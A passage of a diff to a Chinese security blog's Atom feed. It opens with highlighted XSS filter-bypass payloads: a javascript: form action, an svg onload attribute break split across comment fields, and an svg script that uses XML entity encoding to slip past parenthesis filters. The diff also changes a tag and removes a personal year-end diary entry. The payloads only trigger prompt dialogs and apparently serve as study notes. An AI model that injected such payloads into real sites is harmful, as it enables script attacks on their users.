class="attribute">src</span>=<span class="value">alert(1)</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;/<span class="title">scirpt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">form</span> <span class="attribute">action</span>=<span class="value">"javascript:prompt(1)"</span> <span class="attribute">method</span>=<span class="value">"post"</span>&gt;</span><span class="tag">&lt;<span class="title">input</span> <span class="attribute">name</span>=<span class="value">"action"</span> <span class="attribute">value</span>=<span class="value">"b"</span>&gt;</span><span class="tag">&lt;/<span class="title">form</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">""</span>&gt;</span><span class="tag">&lt;<span class="title">svg</span>/<span class="attribute">a</span>=<span class="value">"&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class="</span><span class="value">comment"</span> <span class="attribute">title</span>=<span class="value">""</span><span class="value">onload='</span>/*"&gt;</span><span class="tag">&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">"*/prompt(1)'"</span>&gt;</span><span class="tag">&lt;/<span class="title">p</span>&gt;</span>   ==》<span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">""</span>&gt;</span><span class="tag">&lt;<span class="title">svg</span>/<span class="attribute">a</span>=<span class="value">""</span><span class="value">xxx"</span>/<span class="attribute">onload</span>=<span class="value">'prompt(21)'</span><span class="value">"&gt;&lt;/p&gt;</span></span></span></span></span></span><br></pre></td></tr></table></figure>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//过滤= 括号等 使用xml编码</span></span><br><span class="line">&lt;svg&gt; <span class="xml"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined">prompt&amp;#40;1)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  </span><br><span class="line">//在SVG向量里面的<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined">元素（或者其他CDATA元素 ），会先进行xml解析。因此&amp;#x28（十六进制）或者&amp;#40（十进制）或者&amp;lpar；（html实体编码）会被还原成（。</span></span></span><br></pre></td></tr></table></figure>
@@ -892,7 +1092,7 @@ Are you sure you want to continue connecting (yes/no)?
     
       <category term="xss" scheme="http://blog.idhyt.xyz/tags/xss/"/>
     
-      <category term="技术" scheme="http://blog.idhyt.xyz/categories/%E6%8A%80%E6%9C%AF/"/>
+      <category term="web" scheme="http://blog.idhyt.xyz/categories/web/"/>
     
   </entry>
   
@@ -1179,43 +1379,6 @@ C:<span class="command">\Program</span> Files<span class="command">\winrar</span
       <category term="virus" scheme="http://blog.idhyt.xyz/tags/virus/"/>
     
       <category term="逆向" scheme="http://blog.idhyt.xyz/categories/%E9%80%86%E5%90%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[我逝去的2013]]></title>
-    <link href="http://blog.idhyt.xyz/2014/01/01/1-annual-summary-2013/"/>
-    <id>http://blog.idhyt.xyz/2014/01/01/1-annual-summary-2013/</id>
-    <published>2014-01-01T13:16:11.000Z</published>
-    <updated>2015-09-20T14:47:19.000Z</updated>
-    <content type="html"><![CDATA[<p>&#160; &#160; &#160; &#160;时间真的是很快，转眼又是一年，还记得去年这个时候跟几个好朋友在北京看了郭德纲的跨年专场，当时在想明年这个时候我在哪里，我会是什么样。就这样不知不觉中去年的明年已经过去了。很多事情都是这样，在不知不觉中失去了。读大学以后就很少写东西了，空间日志这种早已被快节奏生活遗忘的东西更是没有碰到过，从11年读研开始每年底写一篇流水账记录，慢慢的总是在写完以后期待这下一次写的时候自己的心情和状态，现在我还是坐在床上，不过地点不是成都，不是北京，是在珠海，人生总是充满了不可预知的未知数，此时此刻，你是否会预料到下一时刻。<br><a id="more"></a></p>
-<hr>
-
-<p>&#160; &#160; &#160; &#160;年初去了北京呆到5月份回来开题答辩，送走师兄师姐，在学校渡过一个闷热的暑假，然后就是新的师弟师妹们开学，导师请吃饭，似乎生活就应该是这样平淡与乏味。可是再平淡的生活中总是会有一些小插曲，不经意中波动了一下你的心弦，若即若离。我说我要去远方感受美好的世界了，其实我只是在让自己的心不要偏离最初太远，有些东西不属于你，呆越久，越迷失。</p>
-<hr>
-
-<p>&#160; &#160; &#160; &#160;9月中旬开始的一个月也是我们这种想进互联网公司的毕业生找工作的最佳时间，过程很辛苦，此处省略1万字。这种过程就是每天重复着同样的事，海投宣讲笔试面试被刷继续。BAT扫完就到了国庆，与腾讯失之交臂落魄回家，回家之后又饱受着良心煎熬，在世界的另一边会是新生的开始吧。国庆回来之后调整状态拿到了金山的offer，与金山算是机缘，无心插柳柳成荫的感觉。接着就跟几个小伙伴出去爬了次雪山，来到了珠海。互联网公司节奏真的很快，转眼已经一个半月了，我也开始慢慢习惯这种生活，也慢慢明白了腾讯为什么会刷我，当时我总觉得是面试官与我不投机，来这边真正接触到反病毒的工作之后发现，确实和漏洞分析有很大的区别，也理解了当初他让我用汇编写几种函数调用我只写出来两种之后他失（bu）望（xie）的表情，编写病毒的语言乱七八糟，最好分析的就是我写出的两种调用，C和C++，还有Delphi，VB，易语言等那种封装好的逆向代码看的总是一种想哭的感觉。事情就是这样，当初觉得自己对的事情，就这样慢慢的变的不对了，当初那么相信的人，最终也会慢慢变得不可信。事情总是经历了，才恍然大悟，成长是需要付出代价。</p>
-<hr>
-
-<p>&#160; &#160; &#160; &#160;至此，我的学生时代基本结束了，年后就是写论文与答辩，毕业散伙，又是一个毕业季，我不知道我能留住什么。如果把正式工作之前定义为上半生，我的上半生就是这样让人失望又给人惊奇。小学时候好像是4年级脑子开窍，开始拿奖状，还记得学前班时候语文数学都是50分我当时就高兴的不得了以为自己得了100分。初中也因为迷上电脑游戏没考上好的高中去了远方读书，高中依然是迷恋网游，到高二直接已经放弃学习了。不知哪天我的脑子开窍了觉得要是读不了大学我该去做什么，接下来就是转学重新开始，学了一年，读了三本。大学又是打游戏，四年考试每次都是作弊过去的，直到大四开始考研，才算学了点东西，当初为什么考研其实我也不知道，几个好朋友考了，那我也考吧，就那样悄悄的默不作声的准备笔试，最后我和我的小伙伴都考上了。所学的专业和想从事的工作也是一直在变来变去，小时候想当一个水利工程师，觉得那样可以每天看到大海，高中的时候想当一个画家或者作家，读大学的时候读了药学，后来转专业本来是要转土木，最后填的时候鬼使神差的填了通信工程学了四年大杂烩什么都没学会，读研时候跟导师学单片机搞硬件，之后不感兴趣学了汇编出去实习做漏洞分析，然后现在做病毒分析，一路下来人生定位在不断的变化着，不知以后会不会再变，应该是不会变了吧，起码我还不算讨厌现在这个职业。</p>
-<hr>
-
-<p>&#160; &#160; &#160; &#160;现在想想我的人生真的很奇特，平时英语从不及格高考意外考了120多读了本科，大学逃课打游戏四级没过靠作弊通过考试的意外的读了研究生，毕业校招找工作我也算是最先找到了满意的工作，就好像当所有人觉得你做不了这件事的时候你突然的就把这事给解决了，所有人都觉得你这种每天嘻嘻哈哈感觉什么都不在乎的人应该是个做事困难户，应该是个不会用大脑思考没有想法的嬉皮士，应该是个没心没肺的人，对于这种人，我只想说，你们猜对（cuo）了。我是一个内心容易患得患失的人，可表现给人的总是我玩世不恭无忧无虑的一面，我不喜欢否定别人和肯定自己，当我对一个人沉默的时候，那是我已经不报希望的时候。我不给任何人承诺，因为我内心善变，可是我给你承诺的时候，你一定要相信我可以做到。我就是这样一个不让别人报希望又会在内心中会为自己的失败找各种借口。</p>
-<hr>
-
-<p>&#160; &#160; &#160; &#160;在别人眼中我一路走来好像总是运气那么好，总是在一群人中慢慢的往外脱离，走的时候或许带的是让人向往的梦想，或许是别人看不到的的悲伤。我承受了这脱离的痛苦，也得到了脱离带给我的希望。我是这样一个不愿去选择的人，是这样随遇而安的人，生活可以平淡，可不要让我在两个美好的事情之间做出选择，如果给不全我就不要给我希望。我内心也是一个没有太多梦想的人，有点懒，爱玩，定力不足，喜欢靠点小聪明安于现状，侥幸走到现在我已很意外。不喜欢有压力，不习惯别人对我报希望，让人失望，那种感觉很不好。希望在2014年能够遇到一个对的人，过上这样一种生活：</p>
-<hr>
-
-<p>&#160; &#160; &#160; &#160;在慵懒的午后，我们一块在阳台上看书喝茶细诉畅谈，<br>傍晚行走在公园，找几个朋友一块，看看过往的行人，聊聊人生和理想，<br>早上一杯酸奶鸡蛋，中午一杯开水一本书，晚上一杯咖啡一首歌，<br>仅此而已，可是，很难。</p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p>&#160; &#160; &#160; &#160;时间真的是很快，转眼又是一年，还记得去年这个时候跟几个好朋友在北京看了郭德纲的跨年专场，当时在想明年这个时候我在哪里，我会是什么样。就这样不知不觉中去年的明年已经过去了。很多事情都是这样，在不知不觉中失去了。读大学以后就很少写东西了，空间日志这种早已被快节奏生活遗忘的东西更是没有碰到过，从11年读研开始每年底写一篇流水账记录，慢慢的总是在写完以后期待这下一次写的时候自己的心情和状态，现在我还是坐在床上，不过地点不是成都，不是北京，是在珠海，人生总是充满了不可预知的未知数，此时此刻，你是否会预料到下一时刻。<br>]]>
-    
-    </summary>
-    
-      <category term="diary" scheme="http://blog.idhyt.xyz/tags/diary/"/>
-    
-      <category term="无法描述" scheme="http://blog.idhyt.xyz/categories/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
     
   </entry>
   
